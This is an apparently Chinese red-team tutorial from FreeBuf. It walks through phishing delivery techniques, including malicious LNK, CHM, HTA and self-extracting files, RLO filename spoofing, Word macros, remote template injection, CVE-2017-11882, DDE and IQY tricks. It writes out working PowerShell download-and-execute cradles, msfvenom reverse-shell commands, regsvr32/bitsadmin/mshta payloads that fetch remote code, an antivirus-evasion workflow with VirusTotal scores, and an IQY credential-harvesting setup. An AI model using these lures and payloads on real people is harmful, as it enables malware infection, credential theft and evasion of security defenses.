**HW期间，为防范钓鱼，即日起FreeBuf将取消投稿文章的一切外部链接。给您带来的不便，敬请谅解~**

## 前言

上一章讲到[邮件服务器的搭建和使用](https://www.freebuf.com/articles/web/260391.html)，那么这章就具体讲解利用方式。

在大型企业边界安全做的越来越好的情况下，不管是 APT 攻击还是红蓝对抗演练，钓鱼和水坑攻击被越来越多的应用。

钓鱼往往需要免杀技术的支撑，但本章只讲述钓鱼和些许免杀技术，免杀系列学习在后续讲解。

## 一、钓鱼小技巧

### 1.1 LNK 快捷方式

lnk文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。lnk钓鱼主要将图标伪装成正常图标，但是目标会执行shell命令。

cs演示：

![slGMeU.png](https://image.3001.net/images/20210323/1616504881_6059e8317b2ece2493545.png!small)

![slGNy6.png](https://image.3001.net/images/20210323/1616504882_6059e83242ada60d71098.png!small)

得到

    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.2.158:80/a'))"

然后新建快捷方式，将上述语句填入

[![slJmhd.png](https://image.3001.net/images/20210323/1616504886_6059e8367b53bc183c78c.png!small)](https://imgchr.com/i/slJmhd)

下一步，然后自己命名一下，点击完成。

当受害者双击之后就会自动执行我们的恶意payload,从目标网站下载并执行。

最终被得到 shell。

[![slY12R.md.png](https://image.3001.net/images/20210323/1616504895_6059e83faf98e7dec87a7.png!small)](https://imgchr.com/i/slY12R)

 **也可以使用msiexec.exe，系统进程，是Windows
Installer的一部分,利用此进程来加载我们shellcode可以达到一定的规避作用。**

    
    
    msfvenom-pwindows/meterpreter/reverse_tcplhost=vpsiplport=1234-fmsi>shell.txt
    ​
    c:\windows\system32\msiexec.exe/q/ihttp://xxx/shell.txt

### 1.2 文件名反转

RLO，即Right-to-Left Override，我们可以在⽂件名中插⼊此类unicode字符，来达到⽂件名反转的效果。

以`cmd.exe`来举例，

将其重命名为`cmdgpj.exe`,然后在 cmd 与 g 之间右键，看图操作

[![slYhGj.md.png](https://image.3001.net/images/20210323/1616504910_6059e84e7c0429e315b2b.png!small)](https://imgchr.com/i/slYhGj)

ok，此时已经变成了 以 jpg 结尾的了。但是双击运行还是 exe 格式运行的。

[![slYoMq.png](https://image.3001.net/images/20210323/1616504918_6059e85610b16bb3e6832.png!small)](https://imgchr.com/i/slYoMq)

再利用`ResourceHacker`修改图标。

找个小姐姐图片转换为 ico 格式。

    
    
    http://www.bitbug.net/

[![slthTO.png](https://image.3001.net/images/20210323/1616504926_6059e85e71fd5c02ed69f.png!small)](https://imgchr.com/i/slthTO)

如图，双击实际上还是运行的cmd。

### 1.3 HTA

HTA是HTML
Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件，本身就是html应用程序，双击就能运行，却比普通网页权限大得多，它具有桌面程序的所有权限。

制作：利用 cs

attacks——>packages——>HTML application

选择powershell 生成。

### 1.4 CHM

CHM（Compiled Help
Manual）即“已编译的帮助文件”。它是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。

制作CHM需要用到一个工具 EasyCHM（http://www.etextwizard.com/）

 **CHM制作过程：**
创建一个文件夹（名字随意），在文件夹里面再创建两个文件夹（名字随意）和一个index.html文件，在两个文件夹内部创建各创建一个index.html文件。

[![slauO1.md.png](https://image.3001.net/images/20210323/1616504936_6059e868775b017e2f25d.png!small)](https://imgchr.com/i/slauO1)

将下列代码放入`index.html`:

    
    
    <!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body>
    command exec
    <OBJECTid=xclassid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"width=1height=1>
    <PARAMname="Command"value="ShortCut">
    <PARAMname="Button"value="Bitmap::shortcut">
    <PARAMname="Item1"value=',calc.exe'>
    <PARAMname="Item2"value="273,1,1">
    </OBJECT>
    <SCRIPT>
    x.Click();
    </SCRIPT>
    </body></html>

打开EasyCHM工具

后点击新建然后导入自己创建的文件夹，点击确定后再点击编译，在弹出的对话框中点击生成CHM按钮，会你生成一个CHM文件。

[![sl0GfU.md.png](https://image.3001.net/images/20210323/1616504953_6059e879e51b9cb357dc4.png!small)](https://imgchr.com/i/sl0GfU)

点击之后就会弹出`calc.exe`

当然我们也可以换成其他的，比如说 powershell payload。直接上线。

### 1.5 自解压

直接上操作。

flash安装软件+cs生成的后门来演示。

选中需要压缩的软件，右键`添加到压缩软件`，

点击`创建自解压格式压缩文件`

![image-20210320184855784](https://image.3001.net/images/20210323/1616504960_6059e880f2654cbe74575.png!small)

点击 高级---> 自解压选项

![image-20210318220437489](https://image.3001.net/images/20210323/1616504962_6059e88213d82275511b8.png!small)

填入`解压路径`, 绝对路劲，（C:\Windows\Temp 文件夹windows电脑都有）

![image-20210318220652094](https://image.3001.net/images/20210323/1616504963_6059e88303302b7bd429b.png!small)

点击`设置--------提取后运行`

![image-20210320185016028](https://image.3001.net/images/20210323/1616504963_6059e883cf45b3abb55db.png!small)

点击模式，`静默模式， 全部隐藏`

![image-20210318221322828](https://image.3001.net/images/20210323/1616504964_6059e884cb731b6a9cb7f.png!small)

点击更新，设置

    
    
    更新方式----解压并更新文件  
    ​  
    覆盖方式----覆盖所有文件

![image-20210318221347841](https://image.3001.net/images/20210323/1616504965_6059e885a4555efd9bbf0.png!small)

确定，出去可以文件名改的像一点。

![image-20210318221615292](https://image.3001.net/images/20210323/1616504966_6059e886be5edb76ba8ef.png!small)

最后点击确定。生成自解压文件，

![image-20210320185233866](https://image.3001.net/images/20210323/1616504968_6059e888049c9ad6bd654.png!small)

图标有点不太对劲，使用 Restorator 把flash图标抠下来，在弄到生成的自解压文件。

具体操作就不写了，直接看结果。

![image-20210320185742196](https://image.3001.net/images/20210323/1616504969_6059e889bf903edfbb802.png!small)

### 1.6 捆绑文件

K8免杀系统自带捆绑器加强版V2.0.EXE

超级文件捆绑器

[![slcMgf.png](https://image.3001.net/images/20210323/1616504978_6059e89232c2731fb8f3e.png!small)](https://imgchr.com/i/slcMgf)

生成，执行之后会执行cmd.exe一样的效果，但此时后门软件也被执行了。

### 1.7 自解压+RLO

## 二、Office钓鱼

> WIN7
>
> Office 2016
>
> MSF
>
> CS

### 2.1 基础知识

宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。现在Office的宏功能已经默认是禁用。

Visual Basic for Applications（VBA）是Visual
Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft
Office软件，也可说是一种应用程式视觉化的Basic 脚本。

常用的套路使对方开启宏，

> 文档是被保护状态，需要启用宏才能查看；
>
> 添加一张模糊的图片，提示需要启用宏才能查看高清图片；
>
> 提示要查看文档，按给出的一系列步骤操作；
>
> 贴一张某杀毒软件的Logo图片，暗示文档被安全软件保护。

推片来源 https://mp.weixin.qq.com/s/YKZ6yWWxOhn2KjTV5lDP7w，侵删

### 2.2 Word宏钓鱼

CS生成宏

![image-20210319151816489](https://image.3001.net/images/20210323/1616504985_6059e89952f50f14bcea9.png!small)

打开Word文档，点击 “Word 选项 — 自定义功能区 — 开发者工具(勾选) — 确定” 。

![image-20210319164252446](https://image.3001.net/images/20210323/1616504986_6059e89aca27b67dd5e7e.png!small)

编写主体内容后，点击 “开发工具 — Visual Basic”，双击 “ThisDocument”
，将原有内容全部清空，然后将宏payload全部粘贴进去，保存并关闭该 VBA 编辑器 。

![image-20210319164451629](https://image.3001.net/images/20210323/1616504988_6059e89c812e5853eceee.png!small)

另存为的Word类型务必要选”Word 97-2003 文档 (*.doc)”，即 doc 文件，保证低版本可以打开。之后关闭，再打开即可执行宏代码。

![image-20210319164617504](https://image.3001.net/images/20210323/1616504989_6059e89dec5e781c2ea38.png!small)

默认情况下，Office已经禁用所有宏，但仍会在打开Word文档的时候发出通知。

![image-20210319164711727](https://image.3001.net/images/20210323/1616504991_6059e89f3fd6c2221e7a1.png!small)

点击启用内容，CS即上线

![image-20210319164800607](https://image.3001.net/images/20210323/1616504991_6059e89ff3c5fd178d6ca.png!small)

MSF生成宏

    
    
    msfvenom -pwindows/meterpreter/reverse_tcp LHOST=192.168.2.148 LPORT=4444-fvba -ovba.txt

上线不稳定。

### 2.3 宏免杀

Evil Clippy

    
    
    https://github.com/outflanknl/EvilClippy/releases

windwos安装:

在Visual Studio开发者命令行窗口中输入下列命令：

    
    
    csc/reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll/out:EvilClippy.exe*.cs

运行成功，生成exe程序。

    
    
    Usage:eviloffice.exe[OPTIONS]+filename  
    ​  
    Author:StanHegt  
    Email:stan@outflank.nl  
    ​  
    Options:  
    -n,--name=VALUEThetargetmodulenametostomp.  
    Thisargumentcanberepeated.  
    -s,--sourcefile=VALUEFilecontainingsubstitutionVBAcode(fake  
    code).  
    -g,--guihideHidecodefromVBAeditorGUI.  
    --gg,--guiunhideUnhidecodefromVBAeditorGUI.  
    -t,--targetversion=VALUETargetMSOfficeversionthepcodewillrunon.  
    -w,--webserver=VALUEStartwebserveronspecifiedporttoserve  
    malicioustemplate.  
    -d,--delmetadataRemovemetadatastream(mayincludeyourname  
    etc.).  
    -r,--randomnamesSetrandommodulenames,confusessomeanalyst  
    tools.  
    --rr,--resetmodulenames  
    Undothesetrandommodulenamesbymakingthe  
    ASCIImodulenamesintheDIRstreammatchtheir  
    Unicodecounterparts  
    -u,--unviewableVBAMakeVBAProjectunviewable/locked.  
    --uu,--viewableVBAMakeVBAProjectviewable/unlocked.  
    -v         Increasedebugmessageverbosity.  
    -h,--help Showthismessageandexit.

没做任何处理之前，VT查杀 39/61

![image-20210319173259042](https://image.3001.net/images/20210323/1616504992_6059e8a0d1444382c989a.png!small)

 **从GUI隐藏/取消隐藏宏** VT查杀 37/60

在VBA GUI编辑器中隐藏所有宏模块（默认的“ ThisDocument”模块除外）。这是通过从项目流[MS-OVBA 2.3.1]中删除模块行来实现的。

    
    
    EvilClippy.exe -g macrofile.doc

撤消由hide选项（-g）完成的更改，以便我们可以在VBA IDE中调试宏。

    
    
    EvilClippy.exe -gg macrofile.doc

![image-20210319173829386](https://image.3001.net/images/20210323/1616504994_6059e8a20bed53ea9d61d.png!small)

 **Stomp VBA（滥用P代码）** VT 查杀 12/60 效果很好，过火绒

将来自文本文件fakecode.vba的虚假VBA代码放在所有模块中，同时保持P代码不变。这滥用了模块流[MS-OVBA
2.3.4.3]的未记录功能。请注意，VBA项目版本必须与主机程序匹配才能执行P代码

    
    
    EvilClippy.exe -s 1.vba macrofile.doc

参数说明：-s 参数是通过假的 vba 代码插入到模块中，用以混淆杀毒程序，这里我们需要写一个正常 无毒正常的 vba 脚本

注意：VBA重踏不适用于以Excel 97-2003工作簿（.xls）格式保存的文件

    
    
    Sub Hello()  
    Dim X  
    X=MsgBox("Hello VBS")

![image-20210319174344328](https://image.3001.net/images/20210323/1616504995_6059e8a3131f518131ac5.png!small)

![image-20210319174445667](https://image.3001.net/images/20210323/1616504996_6059e8a40c19436e60127.png!small)

效果比较好，并且可以成功上线，

![image-20210319174602572](https://image.3001.net/images/20210323/1616504996_6059e8a4d604ba4e642a4.png!small)

多参数混合使用：

    
    
    EvilClippy.exe-s1.vba-g-rhello.docVT查杀12/61

其余更多请看这里https://github.com/outflanknl/EvilClippy

其他免杀方法：

http://www.h0r2yc.com/2019/08/01/office%E5%AE%8F%E6%94%BB%E5%87%BB%E5%8F%8A%E5%85%8D%E6%9D%80/

https://skewwg.github.io/2020/12/05/diao-yu-yu-she-gong-xi-lie-zhi-office-hong/

### 2.4 远程模板注入宏代码

利用Word文档加载附加模板时的缺陷所发起的恶意请求，而达到的攻击目的，所以当目标用户点开攻击者发送的恶意Word文档就可以通过向远程服务器发送恶意请求的方式，然后加载模板执行恶意模板的宏。

发送的文档本身不带恶意代码，所以能过很多静态检测。只需要在远程DOTM文档中编写宏病毒或者木马即可。

思路：

> 编写一个带有宏代码的DOTM文档，上传服务器
>
> 编写一个能够远程连接的DOCX文档
>
> 将该文档压缩找到并更改settings.xml.rels文件中的内容，将其中的target内容修改为服务器上DOTM文档的URL
>
> 将DOCX解压后的内容再以存储模式压缩为ZIP
>
> 修改后缀名为DOCX，打开后即可实现远程注入宏文档

按照上述Word宏钓鱼方法制作，保存时保存类型为 dotm ， fish.dotm,

开启Web服务，放在其目录下，

    
    
    http://192.168.2.148:8000/hello.doc

制作 docx

直接下载份简历

![image-20210319191529116](https://image.3001.net/images/20210323/1616504997_6059e8a5e16348f9ae895.png!small)

将下载的简历文件后缀 docx 改为 zip,解压.

![image-20210319190440106](https://image.3001.net/images/20210323/1616504999_6059e8a77271e490e4124.png!small)

将 target 内容改为`http://192.168.2.148:8000/hello.doc`,之后

全选目录所有文件，邮件压缩问 yanmie.zip,

![image-20210319192126664](https://image.3001.net/images/20210323/1616505000_6059e8a898672dcdb697c.png!small)

之后再把zip 后缀改为 docx即可。

靶机打开，启用宏，可上线。

![image-20210319191420197](https://image.3001.net/images/20210323/1616505002_6059e8aa0aa5b7bfdbe0c.png!small)

### 2.5 CVE-2017-11882

适用于：

    
    
    MicrosoftOffice 2000  
    ​  
    MicrosoftOffice 2003  
    ​  
    MicrosoftOffice 2007 Service Pack 3  
    ​  
    MicrosoftOffice 2010 Service Pack 2  
    ​  
    MicrosoftOffice 2013 Service Pack 1  
    ​  
    MicrosoftOffice 2016  
    ​  
    MicrosoftOffice 365

Microsoft Office Word 的一个执行任意代码的方法，可以在不启用宏的情况下执行任意程序。

这个功能的本意是为了更方便地在 word 里同步更新其它应用的内容，比如说在一个 word 文档里引用了另一个 excel 表格里的某项内容，通过连接域
(Field) 的方式可以实现在 excel 里更新内容后 word 中同步更新的效果，问题出在这个域的内容可以是一个公式
(或者说表达式)，这个公式并不限制内容。

GitHub：

    
    
    https://github.com/Ridter/CVE-2017-11882

使用：

    
    
    python Command109b_CVE-2017-11882.py -c"cmd.exe /c calc.exe"-otest.doc

生成 test.doc 文档，靶机打开。成功弹出加算器

![image-20210319161346054](https://image.3001.net/images/20210323/1616505003_6059e8aba8febcf9b84de.png!small)

msf 复现。

项目

    
    
    https://github.com/0x09AL/CVE-2017-11882-metasploit
    
    
    exploit/windows/fileformat/office_ms17_11882

有点不稳，老是上线不了

![image-20210319161934022](https://image.3001.net/images/20210323/1616505005_6059e8ad69538f5065f8b.png!small)

配合 HTA上线

    
    
    exploit/windows/misc/hta_server
    ​
    http://192.168.2.148:8080/IbsbCdtZ.ht

![image-20210319163708609](https://image.3001.net/images/20210323/1616505008_6059e8b07b957c8689085.png!small)

靶机打开`test2.doc`直接上线

![image-20210319164005168](https://image.3001.net/images/20210323/1616505011_6059e8b3147a92c4e0f6d.png!small)

### 2.5 word 中插入外部对象(OLE)方式欺骗

![image-20210319204824562](https://image.3001.net/images/20210323/1616505013_6059e8b55d73c94e7c30e.png!small)

改变题注，更加逼真

![image-20210319205309812](https://image.3001.net/images/20210323/1616505014_6059e8b6bec77002889ba.png!small)

![image-20210319205326159](https://image.3001.net/images/20210323/1616505015_6059e8b79bdf97e5eba68.png!small)

双击，选择确定，即可上线。

### 2.6 构造DDE钓鱼文档

创建一个文档 dde.docx ,之后双击打开 dde.docx,直接Ctrl +
f9快捷键便可以快速帮助创建一个域,我们则只需要在花括号中添加如下指令(弹出一个计算器),实战过程中可以远程加载我们的木马。

    
    
    DDEAUTOc:\\windows\\system32\\cmd.exe"\/k calc.exe"

![image-20210319210138079](https://image.3001.net/images/20210323/1616505016_6059e8b8a406bc562dead.png!small)

![image-20210319210150369](https://image.3001.net/images/20210323/1616505017_6059e8b96dc05da4efb02.png!small)

成功弹出计算器。

这里用ps远程下载马。

![image-20210319210251889](https://image.3001.net/images/20210323/1616505018_6059e8ba820029fc226e5.png!small)

输入

    
    
    DDEAUTO"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.2.148:8000/beacon.ps1'); # ""Microsoft Document Security Add-On"

![image-20210319210948328](https://image.3001.net/images/20210323/1616505019_6059e8bb4afb352878dab.png!small)

点击是---> 是--->确认 后即上线。

### 2.7 IQY特性钓鱼

> 利用nishang下的Out-WebQuery.ps1， 脚本生成包含恶意 payload url 的 iqy 文件。

可以将IYQ简单的理解成内置在excel中的一种特殊‘web浏览器’（不能加载脚本），通过IQY【即web查询】语句，可以直接将各类web上的列表数据轻松引入到当前的excel中，而正是因为这样，从而给了我们利用excel制作钓鱼邮件的机会，假如你要引入的web数据是入侵者事先准备好的一段payload
iqy恶意代码，那结果就不言而喻了。

 **利用过程：**

新建一个excel文件，找到"数据"-->"自网站"-->"地址"，填写要抓取数据的网站url，选中想抓取数据的表单

![image-20210320095353521](https://image.3001.net/images/20210323/1616505020_6059e8bc7ce44a579fc03.png!small)

点击导入

![image-20210320095423476](https://image.3001.net/images/20210323/1616505022_6059e8be12ac7a00c10c3.png!small)

点击确定，即可成功导入

![image-20210320095447284](https://image.3001.net/images/20210323/1616505023_6059e8bf028f6b9f6e79c.png!small)

接下来利用IYQ打开计算机来看看效果

在我们自己的服务器的网站目录下放一个payload.html文件，内容是IYQ代码

    
    
    =cmd|'/c calc.exe '!A0

接下来就是按照之前的方法，来拉取我们自己服务器上的payload文件

![image-20210320101555566](https://image.3001.net/images/20210323/1616505024_6059e8c04c14a9e6dc062.png!small)

导入

![image-20210320100212731](https://image.3001.net/images/20210323/1616505025_6059e8c17599bf660025d.png!small)

![image-20210320101627913](https://image.3001.net/images/20210323/1616505026_6059e8c2800b84da65eb2.png!small)

点击是，即可弹出计算器

![image-20210320101645783](https://image.3001.net/images/20210323/1616505027_6059e8c37b1c2793c8fbe.png!small)

将文件保存，放在靶机打开

![image-20210320101751297](https://image.3001.net/images/20210323/1616505028_6059e8c49caa88cb86da5.png!small)

点击启用内容，继续点击是，即可弹出计算器。

![image-20210320101807738](https://image.3001.net/images/20210323/1616505029_6059e8c5947a3d316d736.png!small)

其他方式

    
    
    regsv***
    =cmd|'/c regsv*** /s /n /u /i:http://ip/D4zv0M.sct scrobj.dll '!A0
    bitsadmin
    =cmd|'/c bitsadmin /transfer e822 http://ip/iqy %APPDATA%\e822.exe&%APPDATA%\e822.exe&del %APPDATA%\e822.exe '!A0
    mshta
    =cmd|'/c mshta http://ip/iqy.hta '!A0

 **接下来进行弹shell操作**

用到的工具：

    
    
    nishang：  
    https://github.com/samratashok/nishang/releases

先在kali准备好payload:

    
    
    exploit/multi/script/web_delivery

![image-20210320103426217](https://image.3001.net/images/20210323/1616505031_6059e8c7a6f9b77fd0c4a.png!small)

用nishang中提供好的Out-WebQuery脚本来生成iqy文件

> iqy文件本身的内容很简单，只有一个包含恶意payload的url：http://192.168.2.148/msf.html，关键也就在这个
> html,我们需要把 html 的内容换成加载我们上面准备好的 meterpreter payload 的 iqy 语句 ：regsv*** /s /n
> /u /i:http://192.168.2.148:8080/ZTPzcY6J5.sctscrobj.dll

然后利用`nishang-master\Client\Out-WebQuery.ps1`,生成文件

    
    
    powershell-execbypass-Command"& {Import-Module ".\Out-WebQuery.ps1";Out-WebQuery -URL http://192.168.2.148:8000/msf.html}"

![image-20210320104230006](https://image.3001.net/images/20210323/1616505035_6059e8cb708d68ff132ef.png!small)

命令成功执行后，会生成一个`iqy文件`

接下来，打开Web服务目录，创建msf.html,内容为刚刚msf生成的paylaod

    
    
    =cmd|'/c regsv*** /s /n /u /i:http://192.168.2.148:8080/ZTPzcY6J5.sct scrobj.dll '!A0

接下来就可以想办法把之前生成的`iqy文件`发送给受害者。

当受害者双击打开时，默认会用Excel打开，弹出警告，点击启用

![image-20210320104826301](https://image.3001.net/images/20210323/1616505036_6059e8ccb607e5111a00c.png!small)

因为前面的iqy文件是用cmd执行的，所以会继续询问是否启动另一个应用程序，CMD.EXE.

![image-20210320104948760](https://image.3001.net/images/20210323/1616505038_6059e8cec4bace28be327.png!small)

点击是，正常情况下监听的msf会生成一个会话。

 **借助IQY窃取目标用户密码**

    
    
    powershell-execbypass-Command"& {Import-Module ".\Out-WebQuery.ps1";Out-WebQuery -URL http://192.168.2.1}"
    
    
    powershell-execbypass  
    cd.\Utility  
    Import-Module.\Start-CaptureServer.ps1  
    Start-CaptureServer-AuthTypeBasic-IPAddress192.168..2.1-LogFilePathC:\windows\temp\log.txt  
    # 注意此处的认证要选择基础认证,监听的 ip 和上面生成 iqy 文件中的 ip 一致,通常都是本机 i

之后把上一步生成的 IQY文件发给靶机，打开

![image-20210320112924327](https://image.3001.net/images/20210323/1616505040_6059e8d04a7fe435250b1.png!small)

![image-20210320112935034](https://image.3001.net/images/20210323/1616505041_6059e8d14b573624d7abd.png!small)

此认证窗口会连续出现三次，相信三次里面总有一个能用的账号密码,因为目标可能也压根搞不清楚这是什么东西,以为是系统的账号密码,就随便输,其实我们主要还是想利用这种方式钓到可用的
owa 或者 v*n 账号密码

![image-20210320113943580](https://image.3001.net/images/20210323/1616505042_6059e8d299192a6e2d52f.png!small)

### 2.8 **PPT 动作按钮特性构造 PPSX钓鱼**

新型PPT钓鱼攻击分析

首先，创建一个普通的PPTX文件，随便填入一些内容，如下图：

![image-20210320114755129](https://image.3001.net/images/20210323/1616505044_6059e8d44c023568d2d2d.png!small)

这里要选择空白的那个，选择以后，在页面中拉出一个触发位置，之后会弹出动作设置的界面,选择鼠标悬停---> 运行程序

msiexec.exe，系统进程，是Windows Installer的一部分,利用此进程来加载我们shellcode可以达到一定的规避作用。

### 2.9 超链接

在PDF、Office文档中内嵌一个跳转链接是很早期的钓鱼方式，通过文字信息的引导，让受害者点开页面，如果缺乏戒心，就可能会获取到受害者的账号、密码、银行卡、身*证等信息。

## 三、邮件钓鱼

邮件服务器相关环境搭建，邮件信息收集请见[这里](https://www.freebuf.com/articles/web/260391.html)

### 3.1 伪造

SRC假漏洞、简历、宏文档、合作利诱、技术交流、钓鱼网站、第三方平台、加好友。

### 3.2 伪造发件人

### 3.3 office 宏钓鱼

### 3.4 直接发送exe引诱

## 四、flash钓鱼

选择域名： http://www.f1ash.cn/

源码： https://github.com/r00tSe7en/Fake-flash.cn

自解压或者捆绑 配合 xss .

详细步骤见 1.6 .

## 五、网站钓鱼

制作钓鱼网站，克隆网站

cs,msf都有这个功能

setoolkit

## 六、BadUsb

https://blog.csdn.net/qq_26091745/article/details/98092211

参考文章：

https://mp.weixin.qq.com/s/YKZ6yWWxOhn2KjTV5lDP7w

https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/

https://github.com/outflanknl/EvilClippy

https://www.jianshu.com/p/bf347241cfd4

https://cloud.tencent.com/developer/article/1633522

https://www.yehe.org/article/62125.html

https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==∣=2247487419&idx=1&sn=06f9f8934611cce555d9bd76464f404f

